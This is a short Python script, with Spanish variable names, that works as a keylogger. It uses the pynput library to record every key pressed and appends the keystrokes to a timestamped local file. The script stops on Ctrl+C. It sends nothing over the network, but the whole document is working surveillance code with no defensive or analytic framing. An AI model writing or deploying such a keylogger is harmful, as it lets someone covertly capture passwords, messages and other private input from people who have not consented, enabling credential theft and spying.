import datetime
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')



def registro(llave):
    f = open(f'keylogger_{d}.lua', "a")

    llave = str(llave)

    if llave == "'\\x03'":
        f.close()
        quit()
    elif llave ==  'Key.enter':
        f.write('\n')
    elif llave == 'Key.space':
        f.write(' ')
    elif llave == 'Key.backspace':
        f.write('BORRAR')
    elif llave == 'Key.shift':
        f.write('')
    else:
        f.write(llave.replace("'",""))

with Listener(on_press=registro) as u:
    u.join()